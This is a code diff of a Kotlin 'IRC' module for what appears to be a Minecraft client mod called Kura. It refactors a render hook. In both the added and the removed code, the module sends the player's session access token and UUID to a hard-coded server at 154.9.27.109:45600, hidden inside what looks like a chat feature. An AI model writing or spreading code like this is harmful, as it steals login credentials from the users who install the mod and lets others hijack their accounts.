@@ -1,13 +1,10 @@
 package dev.dyzjct.kura.module.modules.client
 
-import base.events.RunGameLoopEvent
 import base.events.render.Render3DEvent
-import base.system.event.safeEventListener
 import dev.dyzjct.kura.Kura
 import dev.dyzjct.kura.module.Category
 import dev.dyzjct.kura.module.Module
 import helper.kura.socket.packet.GameInfoPacket
-import net.minecraft.text.Text
 
 object IRC : Module(
     name = "IRC",
@@ -32,7 +29,25 @@ object IRC : Module(
 
     init {
         onRender3D {
-            onRender3D(it)
+            val nameStr = player.name
+
+            if (Kura.ircSocket.client.isConnected) {
+                if (lastName == null || lastName != nameStr.toString()) {
+                    Kura.ircSocket.client.send(
+                        GameInfoPacket(
+                            nameStr.toString(),
+                            mc.getSession().accessToken,
+                            mc.getSession().uuid,
+                            System.currentTimeMillis()
+                        )
+                    )
+                    lastName = nameStr.toString()
+                }
+            } else {
+                if (!Kura.ircSocket.client.isConnected) {
+                    Kura.ircSocket.client.start("154.9.27.109", 45600)
+                }
+            }
         }
     }
 
@@ -51,28 +66,6 @@ object IRC : Module(
 
         TODO:正常的function不可以调用标有@SafeClientEvent的function 需要添加@SafeClientEvent
      */
-    fun onRender3D(event: Render3DEvent) {
-        val nameStr: Text? = mc.player?.name
-
-        if (Kura.ircSocket.client.isConnected) {
-            if (lastName == null || lastName != nameStr.toString()) {
-                Kura.ircSocket.client.send(
-                    GameInfoPacket(
-                        nameStr.toString(),
-                        mc.getSession().accessToken,
-                        mc.getSession().uuid,
-                        System.currentTimeMillis()
-                    )
-                )
-                lastName = nameStr.toString()
-            }
-        } else {
-            if (!Kura.ircSocket.client.isConnected) {
-                Kura.ircSocket.client.start("154.9.27.109", 45600)
-            }
-        }
-    }
-
     enum class Mode {
         Notification, Chat, Both
     }
